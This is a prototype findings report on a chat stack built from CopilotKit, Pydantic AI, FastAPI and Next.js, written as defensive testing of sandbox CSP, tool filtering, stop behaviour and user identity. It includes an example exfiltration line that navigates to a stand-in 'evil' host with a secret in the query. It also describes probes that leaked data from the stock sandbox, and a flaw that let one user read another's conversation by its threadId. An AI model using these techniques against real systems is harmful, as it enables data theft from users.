# Chat end-to-end spike: findings

Throwaway prototype. Everything below was observed in headless Chromium through browser → Next.js → CopilotRuntime → FastAPI → `FunctionModel`, unless the line says "from source" or "not verified". Versions: CopilotKit 1.83.0, `@ag-ui/client` 1.0.2, pydantic-ai-slim 2.64.0, Next.js 15.5.4, Chromium from Playwright 1248. Other browsers were not tested.

## Verdicts

| # | Question | Verdict |
|---|---|---|
| 1 | Open Generative UI from Pydantic AI | Works with caveat: causes a second run by default |
| 2 | A2UI table with custom catalog | Works |
| 3 | Per-request tool filter and instructions | Works with caveat: advisory, not enforcement |
| 4 | Re-render stored Answers with no run | Works, no copied renderer. `setMessages` works only with a timing wait |
| 5 | Stop | Works with caveat: `on_cancel` needs a small patch. Tab close does not cancel by default |
| 6 | Sandbox CSP per ADR-0004 | Works with caveat: 10-line wrapper, but CSP alone does not stop exfiltration |
| 7 | `sendPrompt` absent, `openLink` confirmed | Works |
| 8 | Model id, cookie, lock, rejected run | Works with caveat: no built-in error display |
| 9 | Vietnamese labels, Model picker | Works |
| Extra | Text fallback, Conversation isolation | See "Contradictions" |

## Contradictions with the design

Read this section first. The evidence is under each question.

1. **ADR-0003 and ADR-0001: any caller with a `threadId` can read a Conversation.** `CopilotRuntime` keeps every run in `InMemoryAgentRunner`, and `POST /agent/default/connect` replays it without FastAPI being involved. A second browser context with a different cookie received User A's message text. "FastAPI authenticates every request" does not hold for `/connect` or `/stop`. `identifyUser` closes the read (Q8), but Next.js then needs a session check against FastAPI on these routes.
2. **ADR-0002: Conversation content also lives in Next.js memory**, in the in-memory runner, not only in Postgres. From source its defaults are 1000 threads and 512 MB. Multiple Next.js instances would also split `/stop` and `/connect`. That multi-instance behaviour is not verified.
3. **ADR-0002 and the single-turn rule: one Generative UI Answer is two runs by default.** The built-in `generateSandboxedUi` tool has `followUp: true`, so the browser posts a second `/run` carrying the tool result in browser-sent history. That conflicts with "the backend ignores any history the browser sends" and looks like a second turn. Override it with `followUp: false` (Q1). A2UI does not do this.
4. **ADR-0004: "no network calls" is not achieved by the sandbox CSP.** `location.href = 'https://evil/?d=secret'` inside the frame reached the attacker endpoint with the full CSP applied. No directive in the frame's own CSP stops it. A `frame-src 'none'` header on the host page does (Q6), so ADR-0004 needs that added.
5. **ADR-0004: `script-src` must include `'unsafe-inline'`.** "Scripts only from `cdn.jsdelivr.net`" cannot be literal, because websandbox runs `jsFunctions` and `jsExpressions` by injecting inline script tags (from source; removing it was not tested). A jsDelivr allowance also admits any published npm package, so the navigation fix matters.
6. **ADR-0004: stock streaming preview leaks.** CopilotKit's preview iframe has no CSP and hit the attacker endpoint during streaming. The reference repo's preview frame has the same shape (from source), so copying its renderer would not help. The wrapper withholds html until complete, which gives up live preview.
7. **Text fallback plan: nothing reports a render failure.** Missing html gives a silent empty grey box, an unknown component shows raw `Unknown component: Nope` to the User, and the run finishes normally in both cases. The browser's tool result is always `UI generated`. A fallback must therefore be decided on the backend by validating tool args before they are forwarded, and that validation is not built here.

Holds as designed: own storage works, read-only reopen needs no replay, single origin and cookies work once configured, and `sendPrompt` can stay unregistered.

## 1. Open Generative UI: works with caveat

A streamed `generateSandboxedUi` call rendered in `iframe[sandbox="allow-scripts "]`. The slider moved the value 10 → 73 and the button 73 → 78, with the `/run` count unchanged at those clicks.

- **Caveat, second run:** the backend saw `follow_up: false`, then `follow_up: true` with roles `user, assistant, tool`. The override below gave exactly one run, and the UI still rendered.
- **Caveat, dev bundler:** `next dev` with webpack fails with `Failed to load sandbox module: Object.defineProperty called on non-object`, and no iframe appears. `next dev --turbopack`, and production builds from both bundlers, render correctly. A table still rendered in the failing setup.
- `next@15.5.4` was my pin; pnpm reports it as deprecated. The product should pick a current version.

```tsx
useFrontendTool({ name: "generateSandboxedUi", description, parameters: GenerateSandboxedUiArgsSchema,
  followUp: false, handler: async () => "UI generated" });
```

This logs `Tool 'generateSandboxedUi' already exists... Overriding`, and drops the placeholder message renderer unless `render` is passed too.

Evidence: `q1-result.json`, `q1-open-generative-ui.png`, `q1-nofollow.png`, `q4b-result.json`, `prod-turbopack.json`, `prod-webpack.json`, `prod-webpack-dev.json`.

## 2. A2UI: works

Tool name `render_a2ui`, injected by `a2ui: { injectA2UITool: true }`. Rendered a 3-row custom `Table` in one run, with no follow-up.

```json
{ "surfaceId": "sales",
  "components": [{ "id": "root", "component": "Table", "title": "Sales by region",
    "columns": ["Region", "Sales"], "rows": [["North", "120"]], "source": "scripted" }] }
```

No `catalogId` arg was needed: the catalog id (`copilotkit://deskmate-tables`) arrived in the activity from context.

**Trap:** `AGUIAdapter` ignores `RunAgentInput.context`, so the A2UI schema and guides do not reach the model on their own. The backend must append them to instructions by hand. Six context entries arrive, and `main.py` passes only the schema. How a real LLM behaves with them is not verified.

Evidence: `q2-result.json`, `q2-a2ui-table.png`.

## 3. Tool filtering: works with caveat

The browser always sent both tools; the model saw only the routed set. Instructions were appended per request.

| Route | Model saw | Result |
|---|---|---|
| none given | both | table |
| `ogui` | `generateSandboxedUi` | sandbox; table request fell to text |
| `a2ui` | `render_a2ui` | table; slider request fell to text |
| `none` | nothing | text |

```python
body = await request.json()  # Starlette caches it, dispatch_request reads it again
async def only_routed(ctx, tool_defs):
    return [t for t in tool_defs if t.name not in RENDER_TOOLS - allowed]

await AGUIAdapter.dispatch_request(request, agent=agent, instructions=per_request_text,
                                   capabilities=[PrepareTools(only_routed)], ...)
```

**Caveat:** the filter limits what the model is offered, not what reaches the browser. With `route:none`, a model that emitted `generateSandboxedUi` anyway still rendered the sandbox, because events are forwarded before the call is rejected. Pydantic AI then called the model a second time in the same run. Whether real providers emit unoffered names is not verified. Do not treat this filter as a security control.

Evidence: `q3-result.json`, `q10-text-fallback.json`, `q10-filtered-tool-called-anyway.png`.

## 4. Re-rendering stored UI: works

`/reopen/<id>` has no `CopilotKitProvider`, no `CopilotChat` and no agent. After a full reload in a new browser context it rendered text, table and Generative UI. The only network call was `GET /api/backend/answers/<id>`, with zero backend runs. The slider still worked locally.

**No copied renderer is needed.** These exports are enough: `OpenGenerativeUIActivityRenderer` and `SandboxFunctionsContext` from `@copilotkit/react-core/v2`; `A2UIProvider`, `A2UIRenderer`, `useA2UIActions`, `initializeDefaultCatalog`, `injectStyles` from `@copilotkit/a2ui-renderer`.

Stored Answer shape. `args` is the raw JSON string, which may be truncated:

```json
{ "id": "uuid", "conversationId": "<threadId>", "runId": "<runId>",
  "status": "complete | stopped | failed", "modelId": "model-a",
  "parts": [ { "type": "text", "text": "Here is a slider. " },
             { "type": "tool", "name": "generateSandboxedUi", "args": "{...}" } ] }
```

Capture: `on_complete` gives `result.new_messages()`, whose `TextPart` and `ToolCallPart` map directly to `parts`. Teeing the encoded SSE stream gave the same parts.

Caveats:

- **Autosize:** the renderer measures height only on the `generating` true-to-false edge after the sandbox exists. Stored content starts false, so a frame stayed at `initialHeight` 60 and clipped. Starting `generating: true` and flipping after 600 ms gave the live height of 174. That timeout is a shortcut.
- With default follow-up, one Answer was stored as two records, so `followUp: false` also simplifies storage.
- `failed` was not exercised through a store path: `on_complete` and `on_cancel` do not cover a model exception.
- Reopen renders text in a plain `<p>`. Markdown is not tested.
- `/reopen` first-load JS was 785 kB in the Turbopack production build, because it imports CopilotKit's main entry.

**`agent.setMessages` comparison:** works only with care. Called straight after `isReady`, it was wiped by `/connect` and the page stayed empty. Called 4 s later it rendered and the slider worked. It always calls `/connect`, shows a live composer, and had the same autosize clip at 60. There is no signal I found for "connect finished", so the delay is a guess. Use the standalone page, which also matches ADR-0002's read-only reopen.

`q4-result.json`'s `hydrate:*` entries came from the runtime's memory replay, not `setMessages` (the real question text appears). That is how the leak in Contradiction 1 was noticed. Use `q4c-hydrate.json` for hydration.

Evidence: `q4-result.json`, `q4-reopen-ogui.png`, `q4-reopen-table.png`, `q4b-result.json`, `q4c-hydrate.json`, `q4-hydrate-delay4000.png`, `q4-hydrate-delay0.png`.

## 5. Stop: works with caveat

The stop button posts `/agent/default/stop/<threadId>`. The runner aborts its fetch, FastAPI sees the disconnect about 0.4 s later, and the model stream gets `CancelledError`.

**`on_cancel` does not fire on its own**, because Starlette cancels the task, and that is external cancellation. Turning the disconnect into a first-party cancel makes it fire:

```python
async def listen(receive):
    while (await receive())["type"] != "http.disconnect":
        pass
    token.cancel()
    await asyncio.Event().wait()  # stream_response ends the task group once the run winds down
response.listen_for_disconnect = listen
```

`on_cancel` then receives `RunCancelled`, whose `new_messages()` holds the partial `TextPart` and a `ToolCallPart` with truncated `args` (a string ending mid-html), plus `usage()`.

| Case | Stored as | Source |
|---|---|---|
| Stop, text | `stopped`, partial text | `on_cancel` |
| Stop, mid tool call | `stopped`, partial text and truncated args | `on_cancel` |
| Stop, no listener patch | same data | SSE tee `finally` only |
| Tab close, default | `complete`, all 1200 chars | `on_complete`; run was not cancelled |
| Tab close, with route hook | `stopped`, partial text | `on_cancel` |

**Tab close does not reach FastAPI by default.** The runner keeps running, so tokens are spent and the Answer completes. That is defensible: the Answer survives. If it should stop instead:

```ts
req.signal.addEventListener("abort", () => runtime.runner.stop({ threadId, ownerId: "" }));
```

`ownerId` is required. Omitting it stopped nothing, silently, because an omitted owner means the server owner. With `identifyUser` it must be the user's id, which was not tested.

Caveats: `listen_for_disconnect` depends on uvicorn reporting ASGI spec 2.3. With 2.4 or later the tee is the fallback. A real database write inside the tee's `finally` would run in a cancelled task and likely needs shielding; not tested. After Stop mid-tool, the UI keeps the spinner and "Building slider" because `generating` never flips, so the host must clear that.

Evidence: `q5-result.json`, `q5-stop-tool.png`, `q5b-tab-close-stop-on-abort.json`.

## 6. Sandbox CSP: works with caveat

The stock renderer has no CSP option, but **no copied renderer is required**. A wrapper registered in `renderActivityMessages` overrides it. The same wrapper is used on reopen.

```ts
const CSP = "default-src 'none'; script-src 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'unsafe-inline'; " +
            "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
const HEAD = `<head><meta http-equiv="Content-Security-Policy" content="${CSP}"></head>`;
// Our <head> comes first, so generated code cannot run before the policy applies.
const secure = (c) => c.htmlComplete ? { ...c, html: [HEAD, ...c.html] } : { ...c, html: undefined };
```

Outbound network was available here, so these are real results. `/evil/*` on a different origin stood in for an attacker.

| Probe | With CSP | Stock renderer |
|---|---|---|
| `fetch`, XHR, WebSocket, `sendBeacon` | blocked, 0 hits | fetch, XHR and WebSocket reached the server |
| Remote image | blocked, 0 hits | image tag reached the server |
| Chart.js from jsDelivr | loaded v4.4.4, canvas painted | loaded |
| Script from cdnjs | blocked | loaded |
| `data:` and `blob:` images | loaded | loaded |
| Exfiltration during streaming preview | 0 hits, html withheld | 9 hits |
| **`location.href` self-navigation** | **reached server with `?d=secret`** | not tested |

`sendBeacon` returned true but the violation fired and no hit arrived.

**Fix for navigation:** host page header `Content-Security-Policy: frame-src 'none'`. With it the navigation made 0 hits, the frame became an error page, and `srcdoc` sandboxes still worked (slider changed to 64). It was only set on `/`, so `/reopen` needs it too. Tested in Chromium only.

Evidence: `q6-q7-result.json`, `q6-final-csp-on.png`, `q6-final-csp-off.png`, `q6-preview-csp-off.png`, `q6-preview-csp-on.png`, `q6-navigation.png`, `q6-navigation-host-csp.png`, `q8-q9-result.json`.

## 7. Sandbox functions: works

`sendPrompt` is opt-in: with no functions registered, `Websandbox.connection.remote` is empty. Registering only `openLink` gives `remote: openLink`.

- `openLink` showed the full URL. Decline returned `{ok:false}` with no popup. Accept returned `{ok:true}` and opened one popup. The spike uses `window.confirm`.
- Generated code could not start a run: `sendPrompt` is not registered, `parent.postMessage` did nothing, `parent.document` and `top.location` raised `SecurityError`, and a direct `fetch` to `/api/copilotkit/.../run` was blocked. Backend runs stayed at 1.

Not tested: A2UI actions. From source they call `copilotkit.runAgent`, so a catalog with buttons would start a run. The `Table` catalog has none.

Evidence: `q6-q7-result.json`, `q7-sandbox-functions.png`.

## 8. Single-turn and identity: works with caveat

- **Model id:** `properties={{ modelId }}` on the provider arrives as `forwardedProps.modelId`. Picker change to `model-b` was observed at FastAPI.
- **Cookie:** default policy delivered `null`. `new CopilotRuntime({ forwardHeaders: { allow: ["cookie", ...] } })` delivered `session=user-a-session`. The option is `forwardHeaders`; `forwardHeadersPolicy` is the resolved property. From source, allow mode forwards only what is listed, so list `authorization` and any `x-*` too.
- **Lock:** a custom `input` slot replaced the composer after one Answer, for text and Generative UI. It removes the textarea, so it is a UI convenience. The backend rule is the real one.
- **Rejected run:** both forms reached `CopilotChat onError`. `CopilotChat` shows no error itself: the page must render it, and the rejected question stays on screen.

| Backend response | `onError` message |
|---|---|
| 200 SSE with `RUN_ERROR` | `This Conversation already has an Answer. Start a new Conversation.` |
| HTTP 409 | `HTTP 409: {"detail":"This Conversation..."}` (raw) |

Prefer the `RUN_ERROR` event.

- **Default follow-up under the rule:** the backend must let the follow-up through by checking the last message role, which is client-asserted. `followUp: false` removes that hole. The glossary's "Retrying adds another Answer" also means the rule must recognise a retry explicitly; retry is not built here.
- **Identity:** `identifyUser` closed the read. User B got an empty stream with no data, the owner still saw it, and no cookie got HTTP 400. Cross-user Stop during a live run was not tested. The spike trusts the cookie value (`shortcut:` in the route), and a real one must ask FastAPI.
- `manage_message_history='server'` was not tested. ADR-0002 will need it.
- `COPILOTKIT_TELEMETRY_DISABLED=true` is needed: the runtime sends telemetry by default.

Evidence: `q8-q9-result.json`, `q8-lock-text.png`, `q8-lock-ogui.png`, `q8-reject-event.png`, `q8-reject-http.png`, `q4b-result.json` (`crossUserConnect`).

## 9. i18n and slots: works

`labels` on `CopilotChat` set the Vietnamese placeholder and disclaimer. Not every label was checked. A Model picker fits inside the composer through the input's slot:

```tsx
<CopilotChatInput {...props} addMenuButton={() => <ModelPicker />} />
```

This replaces the add-attachment button.

Evidence: `q9-model-picker-in-composer.png`, `prod-turbopack.json`, `q9-vietnamese-model-picker.png` (earlier placement, above the composer).

## Text fallback and failure states

| Failure | What the User sees | Signal to backend |
|---|---|---|
| Sandbox call with no html | Empty grey box | None |
| Unknown A2UI component | `Unknown component: Nope` | None |
| Stopped mid-tool, reopened | Partial text and my placeholder line | `status: stopped` |

Routing to text works (Q3, route `none`). Falling back after a bad render does not exist in the stack. Setting `a2ui.schema` on the runtime may give validation retries (from source; not tested).

Evidence: `q10-text-fallback.json`, `q10-ogui-no-html.png`, `q10-a2ui-unknown-component.png`, `q10-reopen-stopped-answer.png`.

## Limits of this spike

- `FunctionModel` proves the plumbing, not LLM behaviour: tool choice, argument order and token timing are scripted. From source, the stock renderer may drop `jsFunctions` that arrive before `html`; not tested.
- `evidence/backend-log.jsonl` covers the `web/e2e/all.sh` run, then the separate `q67` rerun. `prod-*.json` came from `e2e/prod.mjs`, run by hand against `next start` and against webpack `next dev`. Those three runs are not in `all.sh`.

## Decisions taken after the spike

Confirmed by the project owner on 2026-11-01, and recorded in ADR-0002, ADR-0003 and ADR-0004.

- Generative UI has no live preview: a placeholder shows until its code is complete, while text still streams.
- The backend holds render tool args, validates them before forwarding, and marks the Answer `failed` with a retry when they are invalid. This holding step was not built or tested in this spike.
- `InMemoryAgentRunner` is accepted for this development-only version and must be reviewed before production.
- Closing a tab lets the Answer finish and be stored. Only the stop button cancels the run.
